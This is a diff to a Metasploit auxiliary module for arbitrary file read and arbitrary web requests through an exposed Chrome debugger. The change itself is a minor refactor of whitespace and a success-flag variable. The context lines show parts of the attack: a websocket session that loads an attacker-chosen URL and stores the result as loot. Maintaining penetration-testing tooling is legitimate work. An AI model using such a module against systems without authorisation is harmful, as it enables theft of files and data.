@@ -2,7 +2,7 @@ class MetasploitModule < Msf::Auxiliary
   require 'eventmachine'
   require 'faye/websocket'
   include Msf::Exploit::Remote::HttpClient
-  
+
   def initialize(info = {})
     super(update_info(info,
       'Name' => 'Chrome Debugger Arbitrary File Read / Arbitrary Web Request',
@@ -76,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
           print_status('Opened connection')
           id = rand(1024 * 1024 * 1024)
 
-          @@succeeded = false
+          @succeeded = false
 
           EM::Timer.new(1) do
             print_status("Attempting to load url #{fetch_uri}")
@@ -109,13 +109,13 @@ class MetasploitModule < Msf::Auxiliary
           if data['result']['result']
             print_good('Retrieved resource')
             store_loot('chrome.debugger.resource', 'text/plain', rhost, data['result']['result']['value'], fetch_uri, 'Resource Gathered via Chrome Debugger')
-            @@succeeded = true
+            @succeeded = true
           end
         end
 
         EM::Timer.new(datastore['Timeout']) do
           EventMachine.stop
-          fail_with(Failure::Unknown, 'Unknown failure occurred') if not @@succeeded
+          fail_with(Failure::Unknown, 'Unknown failure occurred') if not @succeeded
         end
       }
     end
